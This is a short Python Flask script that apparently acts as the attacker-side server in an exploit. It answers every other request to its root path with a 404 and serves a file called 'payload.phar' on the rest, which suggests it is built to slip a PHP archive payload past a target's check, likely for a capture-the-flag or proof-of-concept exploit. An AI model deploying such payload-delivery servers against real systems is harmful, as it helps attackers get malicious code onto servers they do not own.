from flask import Flask, send_file, abort

app = Flask(__name__)

count = 0

@app.route("/")
def index():
    global count

    count += 1

    if count % 2:
        print("> Rejecting")
        abort(404)

    print("> Serving payload")

    return send_file('payload.phar', as_attachment=True)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=6767)